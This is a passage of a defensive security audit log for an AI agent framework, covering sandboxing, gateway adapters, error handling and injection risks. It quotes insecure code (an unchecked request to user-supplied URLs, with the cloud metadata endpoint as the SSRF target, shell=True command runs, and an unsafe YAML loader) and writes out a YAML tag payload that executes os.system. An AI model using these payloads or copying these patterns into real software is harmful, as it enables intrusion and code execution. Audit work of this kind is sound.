| P38-1 | MEDIUM | queue.Queue() unbounded — no maxsize on producer-consumer queues |
| P38-2 | MEDIUM | subprocess.run() without timeout — indefinite blocking possible |
| P38-3 | MEDIUM | SQLite WAL passive checkpoint only — no WAL size cap |
| P38-4 | INFO | Config write atomicity confirmed — no issue |
| P38-5 | MEDIUM | Long-held lock during file I/O in gateway/session.py — DoS vector |
| P38-6 | HIGH | coerce_tool_args no string-length limit — memory exhaustion |
| P38-7 | MEDIUM | MAX_* constants are display-only, not input validation |

---

## Pass #39 – Tool-Call Specific Deep Scan (Round 2) – 2026-05-25T00:30:00Z

Scope: tools/mcp_tool.py, tools/code_execution_tool.py, tools/terminal_tool.py, tools/delegate_tool.py, tools/schema_sanitizer.py, model_tools.py

### P39-1 · execute_code sandbox — no syscall-level isolation — MEDIUM

**File:** `tools/code_execution_tool.py` (execute_code sandbox)

The execute_code sandbox does not use seccomp, namespaces, cgroups, or other syscall-level isolation. The child process runs with the same user syscall interface as the parent. A malicious script could use syscalls not intended by the sandbox design (e.g., `ptrace` for debugging, `socket` for network exfiltration).

**Recommendation:** Consider adding a seccomp profile (via `seccomp` module or `libseccomp`) to restrict syscalls to only those needed by the Python subprocess. Alternatively, consider running the sandbox in a container (via `docker run` or `containerd`) for stronger isolation.

---

### P39-2 · delegate_tool — no explicit credential/API key cleanup in finally block — LOW

**File:** `tools/delegate_tool.py` (_run_single_child)

After the child subprocess exits, API keys and credentials remain in the child's environment and memory until garbage collection. There is no explicit credential cleanup in a `finally` block (beyond `_restore_primary_runtime` which restores env, but doesn't clear secrets from the child's memory space).

**Recommendation:** Add explicit env var cleanup (unset API keys) in the child's `finally` block, or use environment sanitization before child startup.

---

### P39-3 · _sanitize_tool_error — doesn't filter URLs, paths, IPs in error body — LOW

**File:** `tools/registry.py` (_sanitize_tool_error)

`_sanitize_tool_error()` strips `HERMES_BREAK`, `HERMES_TOOL_ERROR`, `HERMES_TOOL_RESULT` structural tokens and CDATA sections, but does not filter URLs, file paths, or IP addresses embedded in the error body. A tool error that reveals an internal URL or file path could aid an attacker in reconnaissance.

**Recommendation:** Add regex patterns to strip URLs (http://, https://), file paths (C:\, /home/, etc.), and IP addresses from tool error content before it reaches the model.

---

### P39-4 · MCP schema normalization — no depth/size cap on _normalize_mcp_input_schema — LOW

**File:** `tools/mcp_tool.py` (_normalize_mcp_input_schema)

`_normalize_mcp_input_schema()` recursively normalizes MCP input schemas but has no depth limit or total size cap. A malicious local MCP server could return a deeply nested schema (e.g., 10,000 levels deep) that causes stack overflow or excessive CPU time during normalization.

**Recommendation:** Add a recursion depth counter and total size accumulator in `_normalize_mcp_input_schema`. Abort with a clear error if depth exceeds a threshold (e.g., 100 levels) or total accumulated schema size exceeds a limit (e.g., 1MB).

---

### P39-5 · terminal_tool workdir — character allowlist well implemented — INFO (Positive)

**File:** `tools/terminal_tool.py` (validate_workdir)

Workdir validation uses a strong character allowlist (`^[A-Za-z0-9/\:_\-.~ +@=,]+$`) that excludes shell metacharacters. Novel injection techniques would be blocked by this allowlist.

---

### P39-6 · delegate_tool MCP inherit — intersection logic prevents tool leak — INFO (Positive)

**File:** `tools/delegate_tool.py` (_preserve_parent_mcp_toolsets)

The parent MCP toolsets are correctly intersected with the subagent's toolsets before being passed to the child, preventing accidental tool leakage to unauthorized subagents.

---

### P39-7 · schema_sanitizer — no eval/compile/exec, purely dict-based — INFO (Positive)

**File:** `tools/schema_sanitizer.py`

`schema_sanitizer` uses purely dict-based traversal with `copy.deepcopy()` for schema normalization. No `eval`, `compile`, or `exec` on schema content.

---

### P39-8 · execute_code cleanup — finally-block sandbox dir removal — INFO (Positive)

**File:** `tools/code_execution_tool.py`

The `finally` block in `execute_code` correctly removes the sandbox directory, stops the RPC thread, and joins with timeout.

---

### P39-9 · MCP error sanitization — credential regex stripping — INFO (Positive)

**File:** `tools/mcp_tool.py` (_sanitize_error)

MCP `_sanitize_error()` strips credentials via 255-char-bounded regex before the error reaches the LLM context.

---

### Summary Table

| # | Area | Issue | Severity |
|---|------|-------|----------|
| P39-1 | execute_code sandbox | No syscall-level isolation (seccomp/namespace) | Medium |
| P39-2 | delegate_tool | No explicit credential cleanup after child exit | Low |
| P39-3 | _sanitize_tool_error | Doesn't filter URLs/paths/IPs in error body | Low |
| P39-4 | MCP schema normalization | No schema depth/size cap (DoS vector) | Low |
| P39-5 | terminal_tool workdir | Character allowlist — well implemented | Positive |
| P39-6 | delegate_tool MCP inherit | Intersection logic prevents tool leak | Positive |
| P39-7 | schema_sanitizer | No eval/compile — purely dict-based | Positive |
| P39-8 | execute_code cleanup | finally-block sandbox dir removal | Positive |
| P39-9 | MCP error sanitization | Credential regex stripping | Positive |

**Total new findings this pass:** 9 (4 positive, 5 issues at Low/Medium severity)

---

## Summary Table (Passes #24–39)

| Pass | Strategy | New Issues | Total Issues |
|------|----------|------------|--------------|
| #24 | Data Persistence & State Management | 16 | ~396 |
| #25 | Dependency & Import Graph | 15 | ~411 |
| #26 | Tool-Call Patterns & Schema Validation | 23 | ~434 |
| #27 | Cross-File Signature & Contract Inconsistency | 16 | ~450 |
| #28 | Adversarial Input Fuzzing | 8 | ~458 |
| #29 | State Machine & Lifecycle Consistency | 10 | ~468 |
| #30 | Architectural & Agentic Coding Review | 12 | ~480 |
| #31 | Concurrency & Parallelism Deep Dive | 7 | ~487 |
| #32 | Data Flow / Taint Analysis + Guardrail Stream Fix | 0 | ~487 |
| #33 | Performance & Efficiency Deep Dive | 0 | ~487 |
| #34 | Control Flow Re-Analysis: Edge Cases & Error Paths | 3 | ~490 |
| #35 | Cross-File Consistency Deep Dive (Round 2) | 4 | ~494 |
| #36 | Dependency & Import Graph Deep Dive (Round 2) | 9 | ~503 |
| #37 | Line-by-Line Lexical Scan (Adversarial Round) | 10 | ~513 |
| #38 | Phase 2 Adversarial: Worst-Case Runtime Assumptions | 7 | ~520 |
| #39 | Tool-Call Specific Deep Scan (Round 2) | 9 | ~529 |

**Critical issues across all passes**: Skill file integrity (P30-3), memory provider prefetch injection (P30-6), plugin config write (P23-5), hook sandbox (P23-1), pre_gateway_dispatch auth bypass (P23-4), no shutdown in PluginManager (P29-9), coerce_tool_args no length limit (P38-6).

**Audit ongoing — more passes to follow.**

*Last updated: 2026-05-25T01:10:00Z*
*Commit at scan: b04760fdb*

---

## Pass #40 – Gateway & Platform Adapter Deep Dive – 2026-05-25T01:10:00Z

Scope: gateway/session.py, gateway/stream_consumer.py, gateway/platforms/base.py,
gateway/platforms/api_server.py, gateway/platforms/webhook.py,
gateway/platforms/dingtalk.py, gateway/platforms/feishu.py, gateway/platforms/wecom.py

### P40-1 · sessions.json corrupted → silent fallback, no recovery sentinel — MEDIUM

**File:** `gateway/session.py` (_ensure_loaded_locked, lines 706–717)

When `sessions.json` is corrupted (JSONDecodeError, ValueError), the exception is caught and printed to stdout but `_loaded` is still set to `True` and execution continues with an empty `_entries` dict. All prior session mappings are permanently lost for that gateway run.

```python
except Exception as e:
    print(f"[gateway] Warning: Failed to load sessions: {e}")
self._loaded = True   # ← set even on corrupted file
```

No recovery path: if `sessions.json` is corrupt, there's no sentinel file or backup to restore from. `has_any_sessions()` then falls back to `len(self._entries) > 1` which is always `False` after a corrupt load.

**Recommendation:** On JSONDecodeError, rename the corrupt file to `sessions.json.broken.<timestamp>` before continuing with an empty store. Add a startup warning that session history may be incomplete. Consider keeping a `sessions.json.backup` that is updated atomically alongside the main file.

---

### P40-2 · _ensure_loaded_locked holds self._lock during file I/O — MEDIUM

**File:** `gateway/session.py` (_ensure_loaded_locked, lines 698–719)

`_ensure_loaded_locked` is called from `get_or_create_session` (line 876) while `self._lock` is held. The lock is also held during the initial JSON load and parsing of `sessions.json`. On a cold start with a large sessions file, this blocks all `get_or_create_session` callers (and by extension all inbound message processing) for the duration of disk I/O.

The lock design comment at line 871–872 says "SQLite calls are made outside the lock to avoid holding it during I/O" but the JSON file read still holds the lock. If the sessions dir is on NFS or a slow disk, the blocking window could be seconds.

**Recommendation:** Load the JSON file outside the lock, then take the lock only to merge the loaded entries. This matches the stated design intent in the comments.

---

### P40-3 · Stream consumer queue is unbounded — could grow indefinitely — LOW

**File:** `gateway/stream_consumer.py` (queue.Queue, line 136)

The internal `queue.Queue` has no `maxsize` argument. When the agent emits deltas faster than the async consumer can drain them (e.g. on a slow platform edit), the queue grows without bound. On a very active session with a slow platform, this could consume significant memory.

**Note:** The `_MAX_FLOOD_STRIKES` mechanism and `_current_edit_interval` adaptive backoff provide backpressure indirectly by slowing drain rate, but they don't bound the queue depth directly.

**Recommendation:** Set `maxsize` on the Queue (e.g. 1000) and drop/prioritize items if the queue is full. Alternatively, track queue depth in a metric for observability.

---

### P40-4 · API server has no per-client rate limiting — only concurrent-run limit — LOW

**File:** `gateway/platforms/api_server.py` (_MAX_CONCURRENT_RUNS only, lines ~2901)

The API server enforces `_MAX_CONCURRENT_RUNS` (max concurrent agent runs) but has no per-key rate limiting on the OpenAI-compatible endpoints. Any client with a valid API key can make unlimited requests per minute, limited only by the concurrent-run gate.

For a local-only server this is low severity (trusted network). For a network-exposed deployment without a reverse proxy in front, this is a gap.

**Recommendation:** Consider adding per-API-key request-per-minute tracking similar to the webhook rate limiter. Until then, operators should put the API server behind a reverse proxy with standard rate-limiting headers if exposed beyond localhost.

---

### P40-5 · API server Bearer auth: empty token allows all — MEDIUM (conditional)

**File:** `gateway/platforms/api_server.py` (_check_auth, lines 770–789)

When `API_SERVER_KEY` is set to an empty string (or the env var is set but empty), `_check_auth` takes the early return at line 778 (`if not self._api_key: return None  # allow all`) and allows all traffic. This is subtle: `os.getenv("API_SERVER_KEY", "")` returns `""` (not None) if the var is set-but-empty, which is falsy in Python and triggers the "no key configured" early exit.

Users who think setting `API_SERVER_KEY=""` means "no auth" may inadvertently expose the server.

**Recommendation:** Distinguish between "not set" (allow all) and "set to empty string" (deny all). Use a sentinel or explicit env-var check.

---

### P40-6 · Webhook idempotency uses unbounded dict with TTL pruning — OK but fragile — LOW

**File:** `gateway/platforms/webhook.py` (_seen_deliveries, lines 131–132, 497–512)

The `_seen_deliveries` dict is cleaned via TTL pruning on each POST. The bound is `rate_limit * idempotency_ttl` (30 * 3600 = 108,000 entries at maximum). This is acceptable but relies on regular POST traffic to prune. If a webhook route fires rarely, stale entries accumulate for up to 1 hour.

The `_delivery_info` dict has the same TTL-based pruning pattern.

**Assessment:** Functionally adequate but the pruning logic is implicit — it depends on regular POST traffic. If a route receives infrequent webhooks, the dict could hold stale entries beyond the TTL window because `_prune_delivery_info` is only called inside `_handle_webhook`.

**Recommendation:** Consider a dedicated background task that periodically prunes both dicts rather than relying on POST frequency for cleanup.

---

### P40-7 · DingTalk credential refresh not explicitly handled — SDK manages it — POSITIVE

**File:** `gateway/platforms/dingtalk.py` (dingtalk_stream.Credential, line 261)

The `dingtalk_stream.Credential` class is constructed once at connect time and the stream client uses it for the duration. The dingtalk-stream SDK handles token refresh internally, so there's no explicit refresh logic needed in the adapter.

**Assessment:** This is correct — the SDK abstracts token lifecycle. The adapter's `_session_webhooks` cache (lines 208–209) and per-chat context dicts are properly cleaned up on disconnect. The `_close_streaming_siblings` cleanup on disconnect (lines 361–372) is well-designed for graceful state finalization.

---

### P40-8 · WeCom secret rotation: no support for multiple active secrets — LOW

**File:** `gateway/platforms/wecom.py` (self._secret, line 156)

WeCom uses a single `WECOM_SECRET` for authentication. If the secret is rotated, the gateway must be restarted (or the config updated and reloaded) to pick up the new secret. There's no multi-secret fallback period.

**Note:** WeCom's WebSocket protocol does not appear to have a built-in rotation grace period in the protocol itself — the token is verified on initial connection. If the SDK handles re-authentication on connection drop, a rotated secret would auto-reconnect with the new value, but the initial connection would fail.

**Recommendation:** If WeCom supports multiple active secrets (like GitLab's token rotation), add support for a list of secrets in config. Otherwise, document that secret rotation requires a gateway restart.

---

### P40-9 · Feishu: webhook verification token validated as second auth layer — POSITIVE

**File:** `gateway/platforms/feishu.py` (webhook anomaly tracker, rate limiting)

Feishu implements verification token validation as a second auth layer (matching openclaw's pattern), sliding-window rate limiting (120 req/min per IP, lines 209–210), and an anomaly tracker for consecutive error responses. These are well-implemented security controls.

**Assessment:** Good layered auth — signature validation on first layer, verification token on second. Rate limiting is appropriately sized (120 req/min per IP).

---

### P40-10 · BasePlatformAdapter lifecycle: all platforms implement connect/disconnect/send — POSITIVE

**File:** `gateway/platforms/base.py` (abstract methods lines 1673–1707)

All platform adapters (Telegram, Discord, Slack, WhatsApp, Signal, Matrix, DingTalk, Feishu, WeCom, Webhook, API Server, etc.) correctly implement `connect`, `disconnect`, and `send` as abstract methods. `get_chat_info` is also consistently implemented across adapters.

The `REQUIRES_EDIT_FINALIZE` flag is well-documented and correctly implemented (DingTalk AI Cards use it, others default to False).

**Assessment:** The base class contract is consistent and well-enforced. No platform silently skips required lifecycle methods.

---

### P40-11 · Stream consumer: think-block filtering is comprehensive — POSITIVE

**File:** `gateway/stream_consumer.py` (_filter_and_accumulate, lines 298–384)

The think-block filtering handles: state machine with open/close tags, partial-tag buffering at buffer boundaries, block-boundary detection to prevent false positives in prose, held-back tail for partial opening tags. This mirrors the CLI implementation and handles all the edge cases described in comments.

**Assessment:** Well-implemented. No obvious bypass vectors in the think-block filter.

---

### P40-12 · Webhook INSECURE_NO_AUTH: non-loopback safety rail — GOOD

**File:** `gateway/platforms/webhook.py` (connect, lines 161–171, _reload_dynamic_routes lines 331–341)

The webhook adapter refuses to start with `INSECURE_NO_AUTH` on a non-loopback host and also skips dynamic routes with that secret on non-loopback binds. This is a strong safety rail against accidental exposure.

**Assessment:** Good defense-in-depth. The startup crash prevents operator error rather than silently downgrading security.

---

### P40-13 · Feishu dedup cache TTL is 24 hours — potentially stale duplicate seen on long-delayed retry — LOW

**File:** `gateway/platforms/feishu.py` (_FEISHU_DEDUP_TTL_SECONDS = 86400, line 206)

Feishu's `MessageDeduplicator` uses a 24-hour TTL. If a delivery takes longer than 24h to retry (e.g. a webhook provider retries after a long delay), the dedup cache entry will have expired and the message will be treated as new. This is generally acceptable for webhook delivery, but could cause duplicate processing in extreme retry scenarios.

**Assessment:** 24-hour TTL is standard for this pattern. Low severity given typical retry windows are much shorter.

---

### P40-14 · API server CORS: no wildcard origin by default — GOOD

**File:** `gateway/platforms/api_server.py` (_origin_allowed, line 764)

CORS is configurable and defaults to restrictive behavior. Origins not in `_cors_origins` are rejected with 403. This is a safe default.

**Assessment:** Good. Operators must explicitly allowlist origins, avoiding accidental exposure.

---

### P40-15 · Session resume_pending not cleared on graceful disconnect — could cause stale resume flag — LOW

**File:** `gateway/session.py` (mark_resume_pending / clear_resume_pending, lines 988–1035)

`resume_pending` is set on gateway restart (`suspend_recently_active`) and cleared only after a successful resumed turn (`clear_resume_pending`). If a session is gracefully disconnected (not restarted), the flag persists. On the next message, `get_or_create_session` returns the existing entry with `resume_pending=True` (line 889–898) but the user may want a fresh session if they explicitly ended the prior one.

**Note:** The `suspended` flag correctly takes precedence over `resume_pending` (line 887–888), so explicit `/stop` always wins.

**Recommendation:** Consider clearing `resume_pending` on explicit session reset (`reset_session`, `switch_session`) so a clean break clears the resume flag.

---

## Summary Table (Passes #24–40)

| Pass | Strategy | New Issues | Total Issues |
|------|----------|------------|--------------|
| #24 | Data Persistence & State Management | 16 | ~396 |
| #25 | Dependency & Import Graph | 15 | ~411 |
| #26 | Tool-Call Patterns & Schema Validation | 23 | ~434 |
| #27 | Cross-File Signature & Contract Inconsistency | 16 | ~450 |
| #28 | Adversarial Input Fuzzing | 8 | ~458 |
| #29 | State Machine & Lifecycle Consistency | 10 | ~468 |
| #30 | Architectural & Agentic Coding Review | 12 | ~480 |
| #31 | Concurrency & Parallelism Deep Dive | 7 | ~487 |
| #32 | Data Flow / Taint Analysis + Guardrail Stream Fix | 0 | ~487 |
| #33 | Performance & Efficiency Deep Dive | 0 | ~487 |
| #34 | Control Flow Re-Analysis: Edge Cases & Error Paths | 3 | ~490 |
| #35 | Cross-File Consistency Deep Dive (Round 2) | 4 | ~494 |
| #36 | Dependency & Import Graph Deep Dive (Round 2) | 9 | ~503 |
| #37 | Line-by-Line Lexical Scan (Adversarial Round) | 10 | ~513 |
| #38 | Phase 2 Adversarial: Worst-Case Runtime Assumptions | 7 | ~520 |
| #39 | Tool-Call Specific Deep Scan (Round 2) | 9 | ~529 |
| #40 | Gateway & Platform Adapter Deep Dive | 15 | ~544 |

**Critical issues across all passes**: Skill file integrity (P30-3), memory provider prefetch injection (P30-6), plugin config write (P23-5), hook sandbox (P23-1), pre_gateway_dispatch auth bypass (P23-4), no shutdown in PluginManager (P29-9), coerce_tool_args no length limit (P38-6).

**Audit ongoing — more passes to follow.**

*Last updated: 2026-05-25T01:10:00Z*
*Commit at scan: b04760fdb*



---

## Pass #41 – Error Handling & Observability Deep Dive – 2026-05-25T02:15:00Z

Scope: `agent/error_classifier.py`, `hermes_logging.py`, `tools/registry.py`, `model_tools.py`, `agent/conversation_loop.py`, `gateway/run.py`

---

### P41-1 · FailoverReason.unknown is the only "catch-all" with no specialized recovery — INFORMATIONAL

**File:** `agent/error_classifier.py` (FailoverReason enum + classify_api_error pipeline)

**Severity:** INFORMATIONAL — not a bug; design is intentional but worth documenting for operators.

`FailoverReason.unknown` (line 62) is the guaranteed fallback at the end of the 8-step classification pipeline. It covers any error that does not match a known pattern and is always `retryable=True`.

**Assessment:** The taxonomy is comprehensive. Every `FailoverReason` variant has a specific recovery path. The "unknown" fallback is appropriate defensive programming. No error type silently disappears without a recovery attempt.

**Notable coverage:**
- Auth: `auth`, `auth_permanent` (lines 28-29)
- Billing: `billing`, `rate_limit` (lines 32-33)
- Server: `overloaded`, `server_error` (lines 36-37)
- Transport: `timeout` (line 40)
- Context/payload: `context_overflow`, `payload_too_large`, `image_too_large` (lines 43-45)
- Model: `model_not_found`, `provider_policy_blocked` (lines 48-49)
- Request format: `format_error`, `multimodal_tool_content_unsupported` (lines 52-53)
- Provider-specific: `thinking_signature`, `long_context_tier`, `oauth_long_context_beta_forbidden`, `llama_cpp_grammar_pattern` (lines 56-59)
- Disambiguation: `_BILLING_PATTERNS` (8 patterns), `_RATE_LIMIT_PATTERNS` (12 patterns), `_CONTEXT_OVERFLOW_PATTERNS` (22 patterns including Chinese), `_SSL_TRANSIENT_PATTERNS` (12 patterns)

**Verdict:** Excellent. Best-in-class error taxonomy.

---

### P41-2 · hermes_logging.py: no ERROR-level file handler — WARNING+ only goes to errors.log — LOW

**File:** `hermes_logging.py` (lines 225-233)

`errors.log` is configured with `level=logging.WARNING`. There is no `ERROR`-level-only handler. All WARNING+ goes to `errors.log`, meaning INFO-level tool activity that gets a warning suffix also lands in the quick-triage log.

**Impact:** Low — operators scanning `errors.log` see a mix of real errors and routine warnings. The separation is useful but not cleanly error-only.

**Recommendation:** Consider adding an `ERROR`-level-only handler as a fourth log file. This would let operators `tail -f errors-only.log` for only actionable items.

---

### P41-3 · gateway/run.py: broad `except Exception:` at module-import bootstrap — LOW

**File:** `gateway/run.py` lines 881, 888, 895

Three near-identical bootstrap exception blocks that use `print()` to stderr because `logger` is not yet initialized at module-import time (noted in comments at lines 861-862). This is intentional and documented.

**Assessment:** Not a bug — known limitation. However, operators debugging gateway startup issues may not realize these warnings are hidden in stderr, not in `gateway.log`.

---

### P41-4 · tools/registry.py: `dispatch()` catches all exceptions and returns `{"error": ...}` — GOOD

**File:** `tools/registry.py` lines 405-416

`dispatch()` wraps all tool execution in `except Exception as e:`, logs with `logger.exception()` (including traceback), sanitizes the error via `_sanitize_tool_error()`, and returns a JSON error string. Errors never silently disappear and the model always receives a valid JSON tool result. The sanitizer itself is also wrapped defensively (lines 414-415: `except Exception: sanitized = raw`).

**Verdict:** Correct error propagation.

---

### P41-5 · tools/registry.py: `tool_error()` helper for consistent JSON error format — GOOD

**File:** `tools/registry.py` lines 563-576

`tool_error(message, **extra)` returns a JSON string: `{"error": message, ...extra}`. The docstring explicitly guides tool handlers to use this instead of raw `json.dumps()`. This enforces consistent error format across all tool handlers.

**Verdict:** Good observability contract. Tool errors are machine-readable.

---

### P41-6 · model_tools.py: `_sanitize_tool_error()` strips framing tokens — GOOD

**File:** `model_tools.py` lines 525-538

`_sanitize_tool_error()` strips structural tokens (`[TOOL_ERROR]`, CDATA fences, role tags) from tool errors before they are shown to the model. Max length 2000 chars with `...` truncation.

**Verdict:** Good — the model receives clean, focused error messages without internal framing noise.

---

### P41-7 · conversation_loop.py: hook failures logged but not fatal — GOOD

**File:** `agent/conversation_loop.py` lines 171-172, 213-214, 223-224, 568-569

Hook failures (`on_session_start`, `pre_llm_call`, etc.) are caught with `except Exception as exc:` and logged at WARNING level. They do not abort the turn. This is correct — hooks are enhancements, not critical path.

**Verdict:** Good. Hook failures are visible to operators without breaking the conversation.

---

### P41-8 · gateway/run.py: `except Exception:` at line 1052 silently swallows fallback resolution errors — MEDIUM

**File:** `gateway/run.py` lines 1052-1053

In `_try_resolve_fallback_provider()`, when iterating over fallback chain entries, any exception from `resolve_runtime_provider()` is silently swallowed (only DEBUG logged at line 1050). The outer `except Exception: pass` at line 1052 then catches and silently discards any error in iterating the fallback list itself.

**Impact:** If all fallback entries fail to resolve, the function returns `None` silently — no warning, no error logged at WARNING level. An operator debugging why the gateway is not using fallback credentials would have no indication in logs that fallback resolution failed entirely.

**Recommendation:** Log at WARNING level when all fallbacks are exhausted.

---

### P41-9 · gateway/run.py: session store errors logged at WARNING (lines 1700-1707) — GOOD

**File:** `gateway/run.py` lines 1700-1707

SQLite session store unavailability is logged at WARNING level, not silently dropped.

**Verdict:** Good. Operators can diagnose session state issues from logs.

---

### P41-10 · gateway/run.py: many `except Exception:` blocks log at DEBUG only — INFORMATIONAL

**File:** `gateway/run.py` (multiple locations: lines 1104, 1114, 1126, 1278, 1313, 1321, 1692, 1743-1744, 1779-1785, 1820-1821)

Many gateway operations use `except Exception:` followed by `logger.debug()`. This is appropriate for expected/benign error paths (e.g., optional plugin loading). However, operators cannot see these in normal logs — only with `--verbose` or `DEBUG` log level.

**Assessment:** Not a bug — defensive DEBUG logging for non-fatal paths is correct. But makes production debugging harder since many failure modes only surface at DEBUG.

---

### P41-11 · hermes_logging.py: `_read_logging_config()` swallows all exceptions silently — LOW

**File:** `hermes_logging.py` lines 387-388

Best-effort config read. If `config.yaml` is corrupted, the function silently returns `(None, None, None)` and logging defaults are used silently. No indication to operator that config was ignored.

**Impact:** Low — defaults are sensible. But a corrupted `logging` section in config.yaml is invisible.

---

### P41-12 · error_classifier.py: `_extract_status_code()` walks cause chain (depth=5) — GOOD

**File:** `agent/error_classifier.py` lines 1069-1085

`_extract_status_code()` walks `__cause__` and `__context__` chains up to 5 levels deep to find HTTP status code. This handles SDK-wrapped exceptions correctly.

**Verdict:** Good. SDK errors that wrap each other are handled.

---

### P41-13 · conversation_loop.py: Codex SSE error handling in lines 1173-1183 — GOOD

**File:** `agent/conversation_loop.py` lines 1173-1183

Response-error extraction for Codex SSE streams surfaces error details rather than silently dropping them.

**Verdict:** Good.

---

### P41-14 · BaseException catches (not just Exception) — used for critical shutdown paths — ACCEPTABLE

**Files:** `hermes_state.py:400`, `hermes_cli/config.py:4767,4877,4933`, `hermes_cli/gateway.py:3286`, `utils.py:129,181,247`, `gateway/session.py:737`

`except BaseException:` (not `except Exception`) is used in critical shutdown/recovery paths where even `KeyboardInterrupt`, `SystemExit`, and `GeneratorExit` must be caught. These are appropriate uses.

**Verdict:** Acceptable. `BaseException` only in truly critical paths. No concerns.

---

### P41-15 · gateway/run.py: `AuthError` caught separately before broad `Exception` — GOOD

**File:** `gateway/run.py` lines 985-993

Primary provider auth failure is caught specifically with `except AuthError as auth_exc:` before the broad `except Exception:` at line 993, so auth errors get special WARNING-level treatment with a "trying fallback" hint.

**Verdict:** Good. Auth errors are visible and recoverable actions are clear.

---

## Pass #41 Summary

**Files examined:** `agent/error_classifier.py` (1134 lines), `hermes_logging.py` (389 lines), `tools/registry.py` (589 lines), `model_tools.py` (923 lines), `agent/conversation_loop.py` (~1200 lines), `gateway/run.py` (~18318 lines)

**Findings:** 15 total — 1 MEDIUM (P41-8: silent fallback exhaustion), 3 LOW (P41-2, P41-3, P41-11), 10 INFORMATIONAL/GOOD, 1 GOOD (P41-1 exceptional taxonomy).

**Overall Assessment:** Error handling infrastructure is strong. The `FailoverReason` taxonomy in `error_classifier.py` is the most impressive component — extensive pattern matching across providers, Chinese-language error messages, nested JSON unwrapping for OpenRouter-wrapped errors, and clear recovery action hints. Tool error propagation via `tools/registry.py dispatch()` is correct. The main concern is P41-8: fallback provider resolution silently swallows errors when all entries fail, leaving operators with no indication of the root cause.

**Audit ongoing — more passes to follow.**

*Last updated: 2026-05-25T02:15:00Z*
*Commit at scan: b04760fdb*

| #41 | Error Handling & Observability Deep Dive | 15 | ~559 |
## Pass #42 – Security Audit: SSRF, Command Injection, Path Traversal, Unsafe Deserialization, Hardcoded Secrets, Input Validation – 2026-05-24T20:15:00Z

---

### Finding F42-1: SSRF — CDP URL Discovery in browser_tool.py (NO url validation)
**Severity:** High  
**File:** `tools/browser_tool.py` lines 246–277  
**Pattern:** `requests.get(version_url)` with user-controlled URL, no `is_safe_url()` check

```python
raw = (cdp_url or "").strip()
...
discovery_url = raw  # user-controlled cdp_url
if discovery_url.lower().endswith("/json/version"):
    version_url = discovery_url
else:
    version_url = discovery_url.rstrip("/") + "/json/version"  # constructed from user input

try:
    response = requests.get(version_url, timeout=10)  # NO is_safe_url() call
    response.raise_for_status()
    payload = response.json()
```

**Issue:** `cdp_url` is a user-supplied CDP/browser endpoint URL. The code constructs `version_url` from it and immediately performs `requests.get(version_url)` with **no** call to `is_safe_url()`. A user could supply `http://169.254.169.254/latest/meta-data/` (AWS IMDS) or an internal service URL and trigger SSRF. The returned `webSocketDebuggerUrl` is then used as a WebSocket target.

**Status:** Previously documented in findings_verification.md (F17-verified). No `is_safe_url()` guard added.

---

### Finding F42-2: yaml.load with Unsafe Loader (ruamel.yaml round-trip mode)
**Severity:** Medium  
**File:** `hermes_cli/xai_retirement.py` lines 204–207  
**Pattern:** `yaml.load()` without SafeLoader

```python
from ruamel.yaml import YAML
yaml = YAML(typ="rt")      # "rt" = round-trip — can serialize arbitrary Python
yaml.preserve_quotes = True
with config_path.open("r", encoding="utf-8") as fh:
    doc = yaml.load(fh)     # No Loader= argument — ruamel.yaml rt mode
```

**Issue:** `ruamel.yaml.YAML(typ="rt")` uses the round-trip loader which can deserialize arbitrary Python objects via YAML tags (e.g., `!!python/object/apply:os.system ["ls"]`). If an attacker-controlled YAML file is loaded, arbitrary code execution is possible. Limited to files under `~/.hermes/` (user-owned).

**Status:** Finding — no SafeLoader usage.

---

### Finding F42-3: Command Injection — quick_commands with shell=True (cli.py)
**Severity:** Medium  
**File:** `cli.py` lines 8413–8423  
**Pattern:** `subprocess.run(..., shell=True)` from user config

```python
if base_cmd.lstrip("/") in quick_commands:
    qcmd = quick_commands[base_cmd.lstrip("/")]
    if qcmd.get("type") == "exec":
        exec_cmd = qcmd.get("command", "")  # from user config.yaml
        result = subprocess.run(exec_cmd, shell=True, capture_output=True, text=True, timeout=30)
```

**Issue:** `quick_commands` are defined in `~/.hermes/config.yaml` (user-writable). Uses `shell=True` with user-supplied command string. `timeout=30` limits damage. Comment says "not agent/LLM controlled" but config file modification by malware = arbitrary shell execution.

**Status:** Design acknowledges risk, no `detect_dangerous_command()` guard applied.

---

### Finding F42-4: Command Injection — quick_commands with shell=True (tui_gateway/server.py)
**Severity:** Medium  
**File:** `tui_gateway/server.py` lines 4738–4748  
**Pattern:** Same root cause as F42-3 — different entrypoint

```python
qcmds = _load_cfg().get("quick_commands", {})
if name in qcmds:
    qc = qcmds[name]
    if qc.get("type") == "exec":
        r = subprocess.run(qc.get("command", ""), shell=True, capture_output=True, text=True, timeout=30)
```

**Issue:** Same as F42-3 but in TUI gateway JSON-RPC server (`/rpc/quick_command` endpoint). User can trigger their own `config.yaml` `quick_commands` via JSON-RPC.

**Status:** Same finding as F42-3.

---

### Finding F42-5: Docker cleanup — shell=True with container IDs
**Severity:** Low  
**File:** `tools/environments/docker.py` lines 634–648  
**Pattern:** `subprocess.Popen(stop_cmd, shell=True)` with constructed container ID string

```python
stop_cmd = (
    f"(timeout 60 {self._docker_exe} stop {self._container_id} || "
    f"{self._docker_exe} rm -f {self._container_id}) >/dev/null 2>&1 &"
)
subprocess.Popen(stop_cmd, shell=True)
```

**Issue:** `self._container_id` is set by Docker daemon, not directly by user. Low severity because container IDs are daemon-controlled. However, if workspace names influence IDs, shell metacharacter injection is theoretically possible.

**Status:** Low risk.

---

### Finding F42-6: GitHub Token Sent on All HTTP Requests (tirith_security.py)
**Severity:** Informational  
**File:** `tools/tirith_security.py` lines 256–259  
**Pattern:** `GITHUB_TOKEN` env var added to outbound HTTP headers

```python
req = urllib.request.Request(url)
token = os.getenv("GITHUB_TOKEN")
if token:
    req.add_header("Authorization", f"token {token}")
```

**Issue:** The `GITHUB_TOKEN` is sent on every `_download_file()` call. However, all callers pass hardcoded `https://github.com/<repo>/releases/...` URLs — so token leakage outside GitHub is not possible. By design for API rate limiting.

**Status:** Expected behavior — informational only.

---

### Finding F42-7: exec(open(...).read()) Pattern in Red-Teaming Skill
**Severity:** Informational  
**File:** `skills/red-teaming/godmode/scripts/parseltongue.py` line 14  
**Pattern:** `exec(open(os.path.join(HERMES_HOME, "skills/...")).read())`

```python
exec(open(os.path.join(
    os.environ.get("HERMES_HOME", os.path.expanduser("~/.hermes")),
    "skills/red-teaming/godmode/scripts/parseltongue.py"
)).read())
```

**Issue:** Dangerous `exec()` pattern. Part of red-teaming skill — intentionally unsafe, acceptable in that context.

**Status:** Intentional red-team tool — informational.

---

